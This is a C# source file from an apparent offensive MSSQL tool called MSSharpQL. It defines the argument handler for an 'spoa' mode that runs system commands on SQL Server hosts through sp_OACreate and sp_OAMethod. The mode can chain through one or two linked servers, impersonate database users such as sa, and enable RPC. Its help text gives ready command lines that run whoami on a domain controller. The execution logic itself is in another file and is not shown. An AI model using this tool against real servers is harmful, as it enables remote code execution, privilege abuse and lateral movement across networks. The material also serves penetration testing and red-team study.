using System;
using System.Collections.Generic;

namespace MSSharpQL.CommandArgs
{
    internal class SPOACreateMethod : ICommand
    {
        public static string CommandName => "spoa";

        public void Execute(Dictionary<string, string> arguments)
        {
            string sqlServer = "";
            string database = "master";
            string cmd = "";
            string userToImpersonate = "";
            string linkedServer = "";
            string doubleLinkedServer = "";
            bool enableRPC = false;
            bool help = false;
            string helpInfo = @"[*] Sp_OACreate & Sp_OAMethod Code Execution

Makes use of Sp_OACreate & Sp_OAMethod to run system commands.

Connecting to a linked server will execute system commands on the host hosting the linked server.

[*] Arguments:

    [+] /server:                MSSQL Server to connection (hostname or IP)
    [+] /db:                    MSSQL Database to use (Default: master)
    [+] /cmd:                   System Command to run
    [+] /linkedserver:          Connect to a linked server to run system commands on that host
    [+] /doublelinkedserver:    Connect to a linked server & then to a second linked server to run commands on that host
    [+] /impersonate:           Impersonate database user before attempting code execution (Only impersonates user on first server connection)
    [+] /enablerpc              Enables RPC on the target specified in the linkedserver argument
    [+] /help                   Display help info

[*] Examples:

    [+] Connect to DC01 & run whoami on DC01
        MSSharpQL.exe spoa /server:dc01 /cmd:whoami

    [+] Connect to DC01, Impersonate sa, & run whoami /all on DC01
        MSSharpQL.exe spoa /server:dc01 /impersonate:sa /cmd:'whoami /all'

    [+] Connect to DC01, Connect to linked server appsrv01, & run whoami on appsrv01
        MSSharpQL.exe spoa /server:dc01 /linkedserver:appsrv01 /cmd:whoami

    [+] Connect to DC01, Connect to first linked server appsrv01, Connect to second linked server dc01, & run whoami on DC01
        MSSharpQL.exe spoa /server:dc01 /linkedserver:appsrv01 /doublelinkedserver:dc01 /cmd:whoami

[!] This method of code execution DOES NOT return output.
";

            if (arguments.ContainsKey("/server"))
            {
                sqlServer = arguments["/server"];
            }
            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/cmd"))
            {
                cmd = arguments["/cmd"];
            }
            if (arguments.ContainsKey("/impersonate"))
            {
                userToImpersonate = arguments["/impersonate"];
            }
            if (arguments.ContainsKey("/linkedserver"))
            {
                linkedServer = arguments["/linkedserver"];
            }
            if (arguments.ContainsKey("/doublelinkedserver"))
            {
                doubleLinkedServer = arguments["/doublelinkedserver"];
            }
            if (arguments.ContainsKey("/enablerpc"))
            {
                enableRPC = true;
            }
            if (arguments.ContainsKey("/help"))
            {
                help = true;
            }

            // Null Arguments Handling

            if (help)
            {
                Console.WriteLine(helpInfo);
                Environment.Exit(0);
            }
            if (string.IsNullOrEmpty(sqlServer))
            {
                Console.WriteLine("[!] Please provide a valid server with the \"/server:\" arugment. Exiting...");
                Environment.Exit(0);
            }
            if (string.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("[!] Please provide a valid command with the \"/cmd:\" arugment. Exiting...");
                Environment.Exit(0);
            }
            if (string.IsNullOrEmpty(linkedServer) && !string.IsNullOrEmpty(doubleLinkedServer))
            {
                Console.WriteLine("[!] Please provide the first linked server with the \"/linkedserver:\" argument when using the \"/doublelinkedserver:\" argument. Exiting...");
                Environment.Exit(0);
            }
            if (string.IsNullOrEmpty(linkedServer) && enableRPC)
            {
                Console.WriteLine("[!] Please provide the target linked server with the \"/linkedserver:\" argument when using the \"/enablerpc\" argument. Exiting...");
                Environment.Exit(0);
            }
            Console.WriteLine("[+] Mode: sp_OACreate & sp_OAMethod Code Execution...\n");

            Commands.SPOA.SPOACreateMethod(cmd, userToImpersonate, sqlServer, database, linkedServer, doubleLinkedServer, enableRPC);
        }
    }
}
